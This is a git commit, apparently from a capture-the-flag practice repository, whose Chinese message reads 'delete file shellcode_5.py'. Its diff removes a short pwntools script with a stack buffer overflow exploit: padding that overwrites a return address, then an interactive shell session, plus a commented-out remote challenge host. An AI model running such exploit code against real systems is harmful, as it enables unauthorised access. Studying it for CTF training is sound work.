2d18ea4074d85b89cba0b7cb4bb105ef89f85a94
乌鸦 <13216173+cvewuya@user.noreply.gitee.com>
2023-09-29 06:09:50 +0000

    删除文件 shellcode_5.py

--- shellcode_5.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-#host = '61.147.171.105'
-#port = 53562
-ELF("a.out")
-p = process('./a.out')
-#p = connect(host, port)
-payload = 'a'* 0x80 + "a" * 8 + p64(0x0000000000001169)
-p.sendline(payload)
-p.interactive()
